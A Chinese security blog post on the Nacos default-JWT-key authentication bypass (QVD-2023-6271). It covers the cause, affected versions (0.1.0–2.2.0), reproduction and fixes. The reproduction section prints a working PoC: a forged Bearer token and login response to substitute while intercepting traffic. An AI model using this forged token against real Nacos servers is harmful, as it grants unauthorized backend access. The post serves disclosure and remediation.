#  nacos身份绕过漏洞   
原创 剑豪321  网络安全学习爱好者   2024-11-13 18:54  
  
## 漏洞描述  
  
Nacos是一个易于使用的平台，专为动态服务发现和配置以及服务管理而设计。可以帮助您轻松构建云原生应用程序和微服务平台。  
  
Nacos 身份认证绕过漏洞(QVD-2023-6271)，开源服务管理平台 Nacos在默认配置下未对 token.secret.key 进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。  
该系统通常部署在内网，用作服务发现及配置管理，历史上存在多个功能特性导致认证绕过、未授权等漏洞，建议升级至最新版本或修改默认密钥，并禁止公网访问，避免给业务带来安全风险。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGDR6lmaEBvZmxtt9POkbC51icSdkk6BgvYgDic9UbD1juNLnicHAgqNtHqZIvBibkhvRxibUup4lSAhia7g/640?wx_fmt=png "")  
## 漏洞追溯  
  
参考官方文档https://nacos.io/zh-cn/docs/v2/guide/user/auth.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGDR6lmaEBvZmxtt9POkbC51E5iaohXY2GXmghMdxNMeiaat2Jt0loPicIOXu8qSfgskWGYYjBqyanFAA/640?wx_fmt=png "")  
  
也就是Nacos的密钥是有默认值的，了解过Nacos的都知道其鉴权方式是JWT，我们知道了密钥即可伪造一个恶意的JWT令牌来进行攻击  
## 原理  
  
nacos在默认情况下未对token.secret.key进行修改，导致攻击者可以绕过密钥认证进入后台。  
  
也就是nacos的密钥是有默认值的，其鉴权是JWT,我们知道密钥即可伪造一个恶意的JWT令牌来攻击  
  
对于jwt加密 其实就是用了base64 密钥是写死在源码里面的 所以直接可以用jwt伪造攻击  
  
对应就是数据包的  
accesstoken  
## 影响版本  
  
0.1.0 <= Nacos <= 2.2.0  
## 漏洞复现  
  
在登录成功时，后台会生成一个accessToken，之后的任何请求都会基于这个accessToken来进行权限鉴定  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGDR6lmaEBvZmxtt9POkbC51kdX2icPQqhA9iagSyJ1En9NnPD6H8hChic1xMGW49KMxZGKghicKDgLCMg/640?wx_fmt=png "")  
  
对于jwt加密，其实就是做了base64加密，关键在于密钥，然而密钥是写死在源码当中的，所以我们可以直接进行JWT伪造攻击  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGDR6lmaEBvZmxtt9POkbC51FnXySqqicupjBfmkT6lY6wF0ibZMbXySaEFJ73SQhhxcLNhdQ8ebqzIA/640?wx_fmt=png "")  
```
访问url:http://169.254.250.138:8848/nacos/index.html#/login
```  
  
登陆抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGDR6lmaEBvZmxtt9POkbC51CR3CMLWDibTyRcNYLvj7rTfxqrhmp5rOYwiawwGuM16EGkS6A4KDzibDw/640?wx_fmt=png "")  
  
拦截返回包填写poc  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGDR6lmaEBvZmxtt9POkbC51MSNHJDCE28ibnPjVqOgbcdkCBicOqCMyeic48ch4mTyTH8E14bN2MElSg/640?wx_fmt=png "")  
  
POC  
```
HTTP/1.1 200
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA
Content-Type: application/json; charset=utf-8
Date: Tue, 14 Mar 2023 16:34:47 GMT
Content-Length: 206

{
 "accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA",
 "tokenTtl": 18000,
 "globalAdmin": false,
 "username": "nacos"
}
```  
  
成功登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGDR6lmaEBvZmxtt9POkbC51JViaQY33dBzyKReRxIDbiaJsqYjUwJwkdUuLAXppuYEJ6wtOfbWnSblg/640?wx_fmt=png "")  
## 修复建议  
  
1.升级为最新版2.2.0.1  
  
2.检查application.properties文件中token.secret.key属性，若为默认值，则自定义密钥  
  
参考官方文档进行修复Authorization (nacos.io)  
  
  
